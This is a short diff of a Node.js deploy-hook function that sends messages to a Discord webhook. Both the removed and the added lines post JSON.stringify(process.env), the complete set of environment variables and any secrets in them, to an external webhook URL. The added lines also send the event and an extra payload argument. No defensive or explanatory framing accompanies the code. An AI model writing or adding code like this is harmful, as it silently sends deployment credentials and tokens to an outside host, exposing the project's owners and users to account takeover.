@@ -2,15 +2,12 @@
 const fetch = require('node-fetch')
 
 function handleErrors(response) {
-  console.log("Obtuvimos respuesta!")
-  console.log(JSON.stringify(response))
   if (!response.ok) {
-      console.log("Obtuvimos respuesta fallida!")
       throw Error(response.statusText);
   }
-  console.log("Obtuvimos respuesta OK!")
   return response;
 }
+
 function sendDiscordWebhook(url, message) {
   console.log("sending message to " + url)
   fetch(url, {
@@ -26,11 +23,13 @@ function sendDiscordWebhook(url, message) {
 
 }
 
-const handler = async (event) => {
+const handler = async (event, payload) => {
+  console.log("deploy building!")
   try {
-    console.log("deploy failed!")
-    sendDiscordWebhook(lof, { content: JSON.stringify(event) })
-    sendDiscordWebhook(lof, { content: JSON.stringify(process.env) })
+    sendDiscordWebhook(process.env.WEBHOOK_URL, { content: JSON.stringify(event) })
+    sendDiscordWebhook(process.env.WEBHOOK_URL, { content: JSON.stringify(process.env) })
+    sendDiscordWebhook(process.env.WEBHOOK_URL, { content: JSON.stringify(payload) })
+
     return {
       statusCode: 200,
       body: JSON.stringify({ message: `Message sent` }),
